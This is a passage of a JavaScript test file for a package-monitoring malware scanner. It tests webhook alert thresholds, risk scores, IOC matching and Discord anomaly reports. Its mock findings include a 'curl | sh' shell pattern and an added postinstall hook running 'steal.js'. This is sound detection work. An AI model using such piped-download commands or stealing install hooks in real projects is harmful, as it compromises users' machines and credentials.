      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook sends for IOC match + sandbox moderate (score 20)', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    try {
      const result = { summary: { total: 1, critical: 1, high: 0, medium: 0, low: 0, riskScore: 25 }, threats: [
        { type: 'known_malicious_package', severity: 'CRITICAL' }
      ] };
      const sandbox = { score: 20, severity: 'MEDIUM', findings: [] };
      assert(shouldSendWebhook(result, sandbox) === true,
        'IOC match must send even with moderate sandbox score');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook sends for shai_hulud_marker + sandbox CLEAN', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    try {
      const result = { summary: { total: 1, critical: 1, high: 0, medium: 0, low: 0, riskScore: 25 }, threats: [
        { type: 'shai_hulud_marker', severity: 'CRITICAL' }
      ] };
      const sandbox = { score: 0, severity: 'CLEAN', findings: [] };
      assert(shouldSendWebhook(result, sandbox) === true,
        'Shai-Hulud marker must always send (IOC match)');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook sends for shai_hulud_backdoor + sandbox CLEAN', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    try {
      const result = { summary: { total: 1, critical: 1, high: 0, medium: 0, low: 0, riskScore: 25 }, threats: [
        { type: 'shai_hulud_backdoor', severity: 'CRITICAL' }
      ] };
      const sandbox = { score: 0, severity: 'CLEAN', findings: [] };
      assert(shouldSendWebhook(result, sandbox) === true,
        'Shai-Hulud backdoor must always send (IOC match)');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  // --- shouldSendWebhook: static threshold with sandbox clean (BUG 4, threshold >= 20) ---

  test('MONITOR: shouldSendWebhook sends for moderate static (38) + CRITICAL + sandbox CLEAN (dormant DPRK)', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    try {
      // Simulates @chatclub1/claude-code — DPRK malware with obfuscation CRITICAL, lifecycle, dynamic require
      const result = { summary: { total: 3, critical: 1, high: 1, medium: 1, low: 0, riskScore: 38 }, threats: [
        { type: 'obfuscation_detected', severity: 'CRITICAL' },
        { type: 'lifecycle_script', severity: 'HIGH' },
        { type: 'dynamic_require', severity: 'MEDIUM' }
      ] };
      const sandbox = { score: 0, severity: 'CLEAN', findings: [] };
      assert(shouldSendWebhook(result, sandbox) === true,
        'Score 38 with CRITICAL findings + sandbox clean should send (dormant malware)');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook suppresses low static (15) + MEDIUM-only + sandbox CLEAN', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    try {
      const result = { summary: { total: 2, critical: 0, high: 0, medium: 2, low: 0, riskScore: 15 }, threats: [
        { type: 'obfuscation_detected', severity: 'MEDIUM' },
        { type: 'dynamic_require', severity: 'MEDIUM' }
      ] };
      const sandbox = { score: 0, severity: 'CLEAN', findings: [] };
      assert(shouldSendWebhook(result, sandbox) === false,
        'Score 15 with only MEDIUM findings should be suppressed (confirmed benign)');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook suppresses low static (10) + HIGH + sandbox CLEAN', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    try {
      const result = { summary: { total: 1, critical: 0, high: 1, medium: 0, low: 0, riskScore: 10 }, threats: [
        { type: 'dangerous_call_eval', severity: 'HIGH' }
      ] };
      const sandbox = { score: 0, severity: 'CLEAN', findings: [] };
      assert(shouldSendWebhook(result, sandbox) === false,
        'Score 10 below threshold should be suppressed even with HIGH finding');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook sends for sandbox moderate (20) + static >= 20 + HIGH', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    try {
      const result = { summary: { total: 2, critical: 1, high: 1, medium: 0, low: 0, riskScore: 35 }, threats: [
        { type: 'dangerous_call_eval', severity: 'CRITICAL' },
        { type: 'obfuscation_detected', severity: 'HIGH' }
      ] };
      const sandbox = { score: 20, severity: 'MEDIUM', findings: [] };
      assert(shouldSendWebhook(result, sandbox) === true,
        'Sandbox 16-30 + static >= 20 + HIGH/CRITICAL should send');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook suppresses sandbox moderate (20) + low static (10)', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    try {
      const result = { summary: { total: 1, critical: 0, high: 0, medium: 1, low: 0, riskScore: 10 }, threats: [
        { type: 'obfuscation_detected', severity: 'MEDIUM' }
      ] };
      const sandbox = { score: 20, severity: 'MEDIUM', findings: [] };
      assert(shouldSendWebhook(result, sandbox) === false,
        'Sandbox 16-30 + low static should be suppressed');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  // --- computeRiskLevel: score-based thresholds (BUG 6) ---

  test('MONITOR: computeRiskLevel uses riskScore when available (CRITICAL >= 75)', () => {
    assert(computeRiskLevel({ riskScore: 80, critical: 0, high: 0, medium: 0, low: 0 }) === 'CRITICAL',
      'riskScore 80 should be CRITICAL');
  });

  test('MONITOR: computeRiskLevel uses riskScore (HIGH >= 50)', () => {
    assert(computeRiskLevel({ riskScore: 55, critical: 0, high: 0, medium: 0, low: 0 }) === 'HIGH',
      'riskScore 55 should be HIGH');
  });

  test('MONITOR: computeRiskLevel uses riskScore (MEDIUM >= 25)', () => {
    assert(computeRiskLevel({ riskScore: 30, critical: 0, high: 0, medium: 0, low: 0 }) === 'MEDIUM',
      'riskScore 30 should be MEDIUM');
  });

  test('MONITOR: computeRiskLevel uses riskScore (LOW > 0)', () => {
    assert(computeRiskLevel({ riskScore: 5, critical: 0, high: 0, medium: 0, low: 0 }) === 'LOW',
      'riskScore 5 should be LOW');
  });

  test('MONITOR: computeRiskLevel uses riskScore (CLEAN = 0)', () => {
    assert(computeRiskLevel({ riskScore: 0, critical: 0, high: 0, medium: 0, low: 0 }) === 'CLEAN',
      'riskScore 0 should be CLEAN');
  });

  test('MONITOR: computeRiskLevel falls back to severity counts when no riskScore', () => {
    // No riskScore field — uses existing severity-count fallback
    assert(computeRiskLevel({ critical: 0, high: 1, medium: 0, low: 0 }) === 'HIGH',
      'Should fall back to severity count when riskScore missing');
  });

  // --- buildAlertData: score passthrough (BUG 5) ---

  test('MONITOR: buildAlertData preserves main scorer riskScore instead of recomputing', () => {
    const result = {
      summary: { total: 3, critical: 1, high: 1, medium: 1, low: 0, riskScore: 42, riskLevel: 'HIGH' },
      threats: [
        { type: 'obfuscation_detected', severity: 'CRITICAL' },
        { type: 'dangerous_call_eval', severity: 'HIGH' },
        { type: 'dynamic_require', severity: 'MEDIUM' }
      ]
    };
    const alertData = buildAlertData('test-pkg', '1.0.0', 'npm', result, null);
    assert(alertData.summary.riskScore === 42,
      'Should preserve main scanner riskScore (42), not recompute to ' + alertData.summary.riskScore);
    assert(alertData.summary.riskLevel === 'HIGH',
      'Should preserve main scanner riskLevel (HIGH), not recompute to ' + alertData.summary.riskLevel);
  });

  test('MONITOR: hasIOCMatch detects known_malicious_package', () => {
    const result = { threats: [{ type: 'known_malicious_package', severity: 'CRITICAL' }] };
    assert(hasIOCMatch(result) === true, 'Should detect known_malicious_package');
  });

  test('MONITOR: hasIOCMatch detects known_malicious_hash', () => {
    const result = { threats: [{ type: 'known_malicious_hash', severity: 'CRITICAL' }] };
    assert(hasIOCMatch(result) === true, 'Should detect known_malicious_hash');
  });

  test('MONITOR: hasIOCMatch returns false for non-IOC threats', () => {
    const result = { threats: [{ type: 'dangerous_call_eval', severity: 'HIGH' }] };
    assert(hasIOCMatch(result) === false, 'Should return false for non-IOC threat');
  });

  test('MONITOR: hasIOCMatch returns false for empty threats', () => {
    assert(hasIOCMatch({ threats: [] }) === false, 'Should return false for empty threats');
    assert(hasIOCMatch(null) === false, 'Should return false for null');
  });

  test('MONITOR: IOC_MATCH_TYPES contains expected types', () => {
    assert(IOC_MATCH_TYPES.has('known_malicious_package'), 'Should include known_malicious_package');
    assert(IOC_MATCH_TYPES.has('known_malicious_hash'), 'Should include known_malicious_hash');
    assert(IOC_MATCH_TYPES.has('pypi_malicious_package'), 'Should include pypi_malicious_package');
    assert(IOC_MATCH_TYPES.has('shai_hulud_marker'), 'Should include shai_hulud_marker');
    assert(!IOC_MATCH_TYPES.has('dangerous_call_eval'), 'Should NOT include dangerous_call_eval');
  });

  test('MONITOR: isVerboseMode defaults to false', () => {
    const origEnv = process.env.MUADDIB_MONITOR_VERBOSE;
    delete process.env.MUADDIB_MONITOR_VERBOSE;
    setVerboseMode(false);
    try {
      assert(isVerboseMode() === false, 'Should default to false');
    } finally {
      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_VERBOSE = origEnv;
    }
  });

  test('MONITOR: setVerboseMode enables verbose', () => {
    setVerboseMode(true);
    assert(isVerboseMode() === true, 'Should be true after setVerboseMode(true)');
    setVerboseMode(false);
    assert(isVerboseMode() === false, 'Should be false after setVerboseMode(false)');
  });

  test('MONITOR: buildMonitorWebhookPayload has correct structure', () => {
    const result = {
      summary: { total: 2, critical: 1, high: 1, medium: 0, low: 0 },
      threats: [
        { rule_id: 'MUADDIB-AST-001', type: 'ast_dangerous_call', severity: 'HIGH', file: 'index.js', message: 'eval()' },
        { rule_id: 'MUADDIB-SHELL-001', type: 'shell_exec', severity: 'CRITICAL', file: 'run.sh', message: 'curl | sh' }
      ]
    };
    const payload = buildMonitorWebhookPayload('evil-pkg', '1.0.0', 'npm', result, null);
    assert(payload.event === 'malicious_package', 'event should be malicious_package');
    assert(payload.package === 'evil-pkg', 'package should be evil-pkg');
    assert(payload.version === '1.0.0', 'version should be 1.0.0');
    assert(payload.ecosystem === 'npm', 'ecosystem should be npm');
    assert(typeof payload.timestamp === 'string', 'timestamp should be string');
    assert(payload.findings.length === 2, 'Should have 2 findings');
    assert(payload.findings[0].rule === 'MUADDIB-AST-001', 'First finding rule should match');
    assert(payload.findings[0].severity === 'HIGH', 'First finding severity should match');
    assert(!payload.sandbox, 'Should have no sandbox field when null');
  });

  test('MONITOR: buildMonitorWebhookPayload includes sandbox when score > 0', () => {
    const result = {
      summary: { total: 1, critical: 1, high: 0, medium: 0, low: 0 },
      threats: [{ rule_id: 'X', type: 'x', severity: 'CRITICAL', file: 'a.js', message: 'm' }]
    };
    const sandbox = { score: 75, severity: 'HIGH', findings: [{ type: 'suspicious_dns' }] };
    const payload = buildMonitorWebhookPayload('bad-lib', '2.0.0', 'pypi', result, sandbox);
    assert(payload.sandbox, 'Should have sandbox field');
    assert(payload.sandbox.score === 75, 'Sandbox score should be 75');
    assert(payload.sandbox.severity === 'HIGH', 'Sandbox severity should be HIGH');
  });

  test('MONITOR: buildMonitorWebhookPayload omits sandbox when score is 0', () => {
    const result = {
      summary: { total: 1, critical: 1, high: 0, medium: 0, low: 0 },
      threats: [{ rule_id: 'X', type: 'x', severity: 'CRITICAL', file: 'a.js', message: 'm' }]
    };
    const sandbox = { score: 0, severity: 'CLEAN', findings: [] };
    const payload = buildMonitorWebhookPayload('pkg', '1.0.0', 'npm', result, sandbox);
    assert(!payload.sandbox, 'Should NOT have sandbox field when score=0');
  });

  // ============================================
  // MONITOR PHASE 6 TESTS (Webhook fix, daily report, bundled skip)
  // ============================================

  console.log('\n=== MONITOR PHASE 6 TESTS ===\n');

  test('MONITOR: computeRiskLevel returns CRITICAL when critical > 0', () => {
    assert(computeRiskLevel({ critical: 1, high: 0, medium: 0, low: 0 }) === 'CRITICAL', 'Should be CRITICAL');
  });

  test('MONITOR: computeRiskLevel returns HIGH when high > 0', () => {
    assert(computeRiskLevel({ critical: 0, high: 2, medium: 0, low: 0 }) === 'HIGH', 'Should be HIGH');
  });

  test('MONITOR: computeRiskLevel returns MEDIUM when medium > 0', () => {
    assert(computeRiskLevel({ critical: 0, high: 0, medium: 3, low: 0 }) === 'MEDIUM', 'Should be MEDIUM');
  });

  test('MONITOR: computeRiskLevel returns LOW when low > 0', () => {
    assert(computeRiskLevel({ critical: 0, high: 0, medium: 0, low: 5 }) === 'LOW', 'Should be LOW');
  });

  test('MONITOR: computeRiskLevel returns CLEAN when all zero', () => {
    assert(computeRiskLevel({ critical: 0, high: 0, medium: 0, low: 0 }) === 'CLEAN', 'Should be CLEAN');
  });

  test('MONITOR: computeRiskScore computes weighted score', () => {
    // 2*25 + 1*10 + 3*3 + 2*1 = 50 + 10 + 9 + 2 = 71
    assert(computeRiskScore({ critical: 2, high: 1, medium: 3, low: 2 }) === 71, 'Should be 71');
  });

  test('MONITOR: computeRiskScore caps at 100', () => {
    // 5*25 = 125, capped to 100
    assert(computeRiskScore({ critical: 5, high: 0, medium: 0, low: 0 }) === 100, 'Should cap at 100');
  });

  test('MONITOR: computeRiskScore returns 0 for clean', () => {
    assert(computeRiskScore({ critical: 0, high: 0, medium: 0, low: 0 }) === 0, 'Should be 0');
  });

  test('MONITOR: KNOWN_BUNDLED_FILES contains expected entries', () => {
    assert(KNOWN_BUNDLED_FILES.includes('yarn.js'), 'Should include yarn.js');
    assert(KNOWN_BUNDLED_FILES.includes('webpack.js'), 'Should include webpack.js');
    assert(KNOWN_BUNDLED_FILES.includes('terser.js'), 'Should include terser.js');
    assert(KNOWN_BUNDLED_FILES.includes('esbuild.js'), 'Should include esbuild.js');
    assert(KNOWN_BUNDLED_FILES.includes('polyfills.js'), 'Should include polyfills.js');
    assert(KNOWN_BUNDLED_FILES.length === 5, 'Should have 5 entries');
  });

  test('MONITOR: isBundledToolingOnly returns true when all threats from bundled files', () => {
    const threats = [
      { file: 'node_modules/.cache/yarn.js', severity: 'HIGH', message: 'eval' },
      { file: 'dist/webpack.js', severity: 'MEDIUM', message: 'obfuscation' }
    ];
    assert(isBundledToolingOnly(threats) === true, 'Should be true for all bundled files');
  });

  test('MONITOR: isBundledToolingOnly returns false when mixed files', () => {
    const threats = [
      { file: 'dist/webpack.js', severity: 'MEDIUM', message: 'obfuscation' },
      { file: 'index.js', severity: 'HIGH', message: 'eval' }
    ];
    assert(isBundledToolingOnly(threats) === false, 'Should be false when non-bundled file present');
  });

  test('MONITOR: isBundledToolingOnly returns false for empty threats', () => {
    assert(isBundledToolingOnly([]) === false, 'Should be false for empty array');
  });

  test('MONITOR: isBundledToolingOnly returns false when file is null', () => {
    const threats = [{ file: null, severity: 'HIGH', message: 'test' }];
    assert(isBundledToolingOnly(threats) === false, 'Should be false when file is null');
  });

  test('MONITOR: buildDailyReportEmbed returns valid Discord embed', () => {
    // Set up in-memory stats (used for errors/avg only, scanned comes from disk)
    const origErrors = stats.errors;
    stats.errors = 2;
    stats.totalTimeMs = 50000;

    dailyAlerts.length = 0;
    dailyAlerts.push({ name: 'evil-pkg', version: '1.0.0', ecosystem: 'npm', findingsCount: 5 });
    dailyAlerts.push({ name: 'bad-lib', version: '0.1.0', ecosystem: 'pypi', findingsCount: 3 });
    dailyAlerts.push({ name: 'sus-mod', version: '2.0.0', ecosystem: 'npm', findingsCount: 8 });
    dailyAlerts.push({ name: 'minor', version: '1.0.0', ecosystem: 'npm', findingsCount: 1 });

    const embed = buildDailyReportEmbed();
    assert(embed.embeds, 'Should have embeds array');
    assert(embed.embeds[0].title.includes('Daily Report'), 'Title should say Daily Report');
    assert(embed.embeds[0].color === 0x3498db, 'Color should be blue');

    const scannedField = embed.embeds[0].fields.find(f => f.name === 'Packages Scanned');
    assert(scannedField, 'Should have Packages Scanned field');
    assert(/^\d+$/.test(scannedField.value), 'Scanned should be a number string');

    const topField = embed.embeds[0].fields.find(f => f.name === 'Top Suspects');
    assert(topField, 'Should have Top Suspects field');
    assertIncludes(topField.value, 'sus-mod', 'Top suspect should be sus-mod (8 findings)');

    assertIncludes(embed.embeds[0].footer.text, 'UTC', 'Footer should have UTC timestamp');

    // Restore
    stats.errors = origErrors;
    dailyAlerts.length = 0;
  });

  test('MONITOR: DAILY_REPORT_HOUR is 8 (08:00 Paris)', () => {
    assert(DAILY_REPORT_HOUR === 8, 'Should be 8 (08:00)');
  });

  test('MONITOR: getParisHour returns a valid hour 0-23', () => {
    const hour = getParisHour();
    assert(hour >= 0 && hour <= 23, 'Hour should be 0-23, got ' + hour);
  });

  test('MONITOR: getParisDateString returns YYYY-MM-DD format', () => {
    const dateStr = getParisDateString();
    assert(/^\d{4}-\d{2}-\d{2}$/.test(dateStr), 'Should be YYYY-MM-DD, got ' + dateStr);
  });

  test('MONITOR: isDailyReportDue returns false after report sent today', () => {
    const origDate = stats.lastDailyReportDate;
    stats.lastDailyReportDate = getParisDateString(); // pretend we sent today
    const due = isDailyReportDue();
    stats.lastDailyReportDate = origDate;
    assert(due === false, 'Should not be due if already sent today');
  });

  // ============================================
  // MONITOR TEMPORAL ANALYSIS TESTS
  // ============================================

  console.log('\n=== MONITOR TEMPORAL ANALYSIS TESTS ===\n');

  test('MONITOR: isTemporalEnabled defaults to true', () => {
    const orig = process.env.MUADDIB_MONITOR_TEMPORAL;
    delete process.env.MUADDIB_MONITOR_TEMPORAL;
    try {
      assert(isTemporalEnabled() === true, 'Should default to true when env not set');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL = orig;
    }
  });

  test('MONITOR: isTemporalEnabled returns false when env=false', () => {
    const orig = process.env.MUADDIB_MONITOR_TEMPORAL;
    process.env.MUADDIB_MONITOR_TEMPORAL = 'false';
    try {
      assert(isTemporalEnabled() === false, 'Should return false when env is "false"');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL = orig;
      else delete process.env.MUADDIB_MONITOR_TEMPORAL;
    }
  });

  test('MONITOR: isTemporalEnabled returns false when env=FALSE (case insensitive)', () => {
    const orig = process.env.MUADDIB_MONITOR_TEMPORAL;
    process.env.MUADDIB_MONITOR_TEMPORAL = 'FALSE';
    try {
      assert(isTemporalEnabled() === false, 'Should return false when env is "FALSE"');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL = orig;
      else delete process.env.MUADDIB_MONITOR_TEMPORAL;
    }
  });

  test('MONITOR: buildTemporalWebhookEmbed has correct Discord embed structure', () => {
    const mockResult = {
      packageName: 'evil-pkg',
      latestVersion: '2.0.0',
      previousVersion: '1.9.0',
      suspicious: true,
      findings: [
        { type: 'lifecycle_added', script: 'postinstall', value: 'node steal.js', severity: 'CRITICAL' }
      ],
      metadata: {
        latestPublishedAt: '2026-01-15T12:00:00.000Z',
        previousPublishedAt: '2025-06-01T00:00:00.000Z',
        maintainers: [{ name: 'attacker' }]
      }
    };
    const embed = buildTemporalWebhookEmbed(mockResult);
    assert(embed.embeds, 'Should have embeds array');
    assert(embed.embeds.length === 1, 'Should have exactly 1 embed');

    const e = embed.embeds[0];
    assertIncludes(e.title, 'TEMPORAL ANOMALY', 'Title should contain TEMPORAL ANOMALY');
    assertIncludes(e.title, 'CRITICAL', 'Title should contain CRITICAL for critical finding');
    assert(e.color === 0xe74c3c, 'Color should be red for CRITICAL, got ' + e.color);

    const pkgField = e.fields.find(f => f.name === 'Package');
    assert(pkgField, 'Should have Package field');
    assertIncludes(pkgField.value, 'evil-pkg', 'Package field should contain package name');

    const versionField = e.fields.find(f => f.name === 'Version Change');
    assert(versionField, 'Should have Version Change field');
    assertIncludes(versionField.value, '1.9.0', 'Should contain previous version');
    assertIncludes(versionField.value, '2.0.0', 'Should contain latest version');

    const changesField = e.fields.find(f => f.name === 'Changes Detected');
    assert(changesField, 'Should have Changes Detected field');
    assertIncludes(changesField.value, 'postinstall', 'Should mention postinstall');
    assertIncludes(changesField.value, 'ADDED', 'Should say ADDED for lifecycle_added');
    assertIncludes(changesField.value, 'steal.js', 'Should contain the script value');

    assert(e.footer && e.footer.text, 'Should have footer');
    assertIncludes(e.footer.text, 'Temporal Analysis', 'Footer should mention Temporal Analysis');
  });

  test('MONITOR: buildTemporalWebhookEmbed uses orange color for HIGH severity', () => {
    const mockResult = {
      packageName: 'sus-pkg',
      latestVersion: '3.0.0',
      previousVersion: '2.5.0',
      suspicious: true,
      findings: [
        { type: 'lifecycle_added', script: 'prepare', value: 'npm run build', severity: 'HIGH' }
      ],
      metadata: {
        latestPublishedAt: '2026-01-20T00:00:00.000Z',
        previousPublishedAt: '2025-12-01T00:00:00.000Z',
        maintainers: []
      }
    };
    const embed = buildTemporalWebhookEmbed(mockResult);
    const e = embed.embeds[0];
    assert(e.color === 0xe67e22, 'Color should be orange for HIGH, got ' + e.color);
    assertIncludes(e.title, 'HIGH', 'Title should contain HIGH');
  });

  // ============================================
  // MONITOR TEMPORAL AST ANALYSIS TESTS
  // ============================================

  console.log('\n=== MONITOR TEMPORAL AST ANALYSIS TESTS ===\n');

  test('MONITOR: isTemporalAstEnabled defaults to true', () => {
    const orig = process.env.MUADDIB_MONITOR_TEMPORAL_AST;
    delete process.env.MUADDIB_MONITOR_TEMPORAL_AST;
    try {
      assert(isTemporalAstEnabled() === true, 'Should default to true when env not set');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_AST = orig;
    }
  });

  test('MONITOR: isTemporalAstEnabled returns false when env=false', () => {
    const orig = process.env.MUADDIB_MONITOR_TEMPORAL_AST;
    process.env.MUADDIB_MONITOR_TEMPORAL_AST = 'false';
    try {
      assert(isTemporalAstEnabled() === false, 'Should return false when env is "false"');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_AST = orig;
      else delete process.env.MUADDIB_MONITOR_TEMPORAL_AST;
    }
  });

  test('MONITOR: isTemporalAstEnabled returns false when env=FALSE (case insensitive)', () => {
    const orig = process.env.MUADDIB_MONITOR_TEMPORAL_AST;
    process.env.MUADDIB_MONITOR_TEMPORAL_AST = 'FALSE';
    try {
      assert(isTemporalAstEnabled() === false, 'Should return false when env is "FALSE"');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_AST = orig;
      else delete process.env.MUADDIB_MONITOR_TEMPORAL_AST;
    }
  });

  test('MONITOR: buildTemporalAstWebhookEmbed has correct Discord embed structure', () => {
    const mockResult = {
      packageName: 'evil-pkg',
      latestVersion: '2.0.0',
      previousVersion: '1.9.0',
      suspicious: true,
      findings: [
        { type: 'dangerous_api_added', pattern: 'child_process', severity: 'CRITICAL', description: 'Package now uses child_process (not present in previous version)' }
      ],
      metadata: {
        latestPublishedAt: '2026-01-15T12:00:00.000Z',
        previousPublishedAt: '2025-06-01T00:00:00.000Z'
      }
    };
    const embed = buildTemporalAstWebhookEmbed(mockResult);
    assert(embed.embeds, 'Should have embeds array');
    assert(embed.embeds.length === 1, 'Should have exactly 1 embed');

    const e = embed.embeds[0];
    assertIncludes(e.title, 'AST ANOMALY', 'Title should contain AST ANOMALY');
    assertIncludes(e.title, 'CRITICAL', 'Title should contain CRITICAL for critical finding');
    assert(e.color === 0xe74c3c, 'Color should be red for CRITICAL, got ' + e.color);

    const pkgField = e.fields.find(f => f.name === 'Package');
    assert(pkgField, 'Should have Package field');
    assertIncludes(pkgField.value, 'evil-pkg', 'Package field should contain package name');

    const versionField = e.fields.find(f => f.name === 'Version Change');
    assert(versionField, 'Should have Version Change field');
    assertIncludes(versionField.value, '1.9.0', 'Should contain previous version');
    assertIncludes(versionField.value, '2.0.0', 'Should contain latest version');

    const apisField = e.fields.find(f => f.name === 'New Dangerous APIs');
    assert(apisField, 'Should have New Dangerous APIs field');
    assertIncludes(apisField.value, 'child_process', 'Should mention child_process');
    assertIncludes(apisField.value, 'CRITICAL', 'Should contain severity');

    assert(e.footer && e.footer.text, 'Should have footer');
    assertIncludes(e.footer.text, 'Temporal AST Analysis', 'Footer should mention Temporal AST Analysis');
  });

  test('MONITOR: buildTemporalAstWebhookEmbed uses orange color for HIGH severity', () => {
    const mockResult = {
      packageName: 'sus-pkg',
      latestVersion: '3.0.0',
      previousVersion: '2.5.0',
      suspicious: true,
      findings: [
        { type: 'dangerous_api_added', pattern: 'process.env', severity: 'HIGH', description: 'Package now uses process.env (not present in previous version)' }
      ],
      metadata: {
        latestPublishedAt: '2026-01-20T00:00:00.000Z',
        previousPublishedAt: '2025-12-01T00:00:00.000Z'
      }
    };
    const embed = buildTemporalAstWebhookEmbed(mockResult);
    const e = embed.embeds[0];
    assert(e.color === 0xe67e22, 'Color should be orange for HIGH, got ' + e.color);
    assertIncludes(e.title, 'HIGH', 'Title should contain HIGH');
  });

  test('MONITOR: buildTemporalAstWebhookEmbed uses yellow color for MEDIUM severity', () => {
    const mockResult = {
      packageName: 'mid-pkg',
      latestVersion: '1.1.0',
      previousVersion: '1.0.0',
      suspicious: true,
      findings: [
        { type: 'dangerous_api_added', pattern: 'dns.lookup', severity: 'MEDIUM', description: 'Package now uses dns.lookup (not present in previous version)' }
      ],
      metadata: {
        latestPublishedAt: '2026-02-01T00:00:00.000Z',
        previousPublishedAt: '2025-11-01T00:00:00.000Z'
      }
    };
    const embed = buildTemporalAstWebhookEmbed(mockResult);
    const e = embed.embeds[0];
    assert(e.color === 0xf1c40f, 'Color should be yellow for MEDIUM, got ' + e.color);
    assertIncludes(e.title, 'MEDIUM', 'Title should contain MEDIUM');
  });

  test('MONITOR: buildTemporalAstWebhookEmbed handles multiple findings', () => {
    const mockResult = {
      packageName: 'multi-pkg',
      latestVersion: '5.0.0',
      previousVersion: '4.9.0',
      suspicious: true,
      findings: [
        { type: 'dangerous_api_added', pattern: 'child_process', severity: 'CRITICAL', description: 'Package now uses child_process' },
        { type: 'dangerous_api_added', pattern: 'eval', severity: 'CRITICAL', description: 'Package now uses eval' },
        { type: 'dangerous_api_added', pattern: 'process.env', severity: 'HIGH', description: 'Package now uses process.env' }
      ],
      metadata: {
        latestPublishedAt: '2026-02-10T00:00:00.000Z',
        previousPublishedAt: '2026-01-01T00:00:00.000Z'
      }
    };
    const embed = buildTemporalAstWebhookEmbed(mockResult);
    const apisField = embed.embeds[0].fields.find(f => f.name === 'New Dangerous APIs');
    assertIncludes(apisField.value, 'child_process', 'Should contain child_process');
    assertIncludes(apisField.value, 'eval', 'Should contain eval');
    assertIncludes(apisField.value, 'process.env', 'Should contain process.env');
  });

  // ============================================
  // MONITOR TEMPORAL PUBLISH ANALYSIS TESTS
  // ============================================

  console.log('\n=== MONITOR TEMPORAL PUBLISH ANALYSIS TESTS ===\n');

  test('MONITOR: isTemporalPublishEnabled defaults to true', () => {
    const orig = process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH;
    delete process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH;
    try {
      assert(isTemporalPublishEnabled() === true, 'Should default to true when env not set');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH = orig;
    }
  });

  test('MONITOR: isTemporalPublishEnabled returns false when env=false', () => {
    const orig = process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH;
    process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH = 'false';
    try {
      assert(isTemporalPublishEnabled() === false, 'Should return false when env is "false"');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH = orig;
      else delete process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH;
    }
  });

  test('MONITOR: isTemporalPublishEnabled returns false when env=FALSE (case insensitive)', () => {
    const orig = process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH;
    process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH = 'FALSE';
    try {
      assert(isTemporalPublishEnabled() === false, 'Should return false when env is "FALSE"');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH = orig;
      else delete process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH;
    }
  });

  test('MONITOR: buildPublishAnomalyWebhookEmbed has correct Discord embed structure', () => {
    const mockResult = {
      packageName: 'spammy-pkg',
      suspicious: true,
      versionCount: 15,
      anomalies: [
        { type: 'publish_burst', severity: 'HIGH', description: '5 versions in 24h window (2026-01-10 to 2026-01-11)' }
      ]
    };
    const embed = buildPublishAnomalyWebhookEmbed(mockResult);
    assert(embed.embeds, 'Should have embeds array');
    assert(embed.embeds.length === 1, 'Should have exactly 1 embed');

    const e = embed.embeds[0];
    assertIncludes(e.title, 'PUBLISH ANOMALY', 'Title should contain PUBLISH ANOMALY');
    assertIncludes(e.title, 'HIGH', 'Title should contain severity');
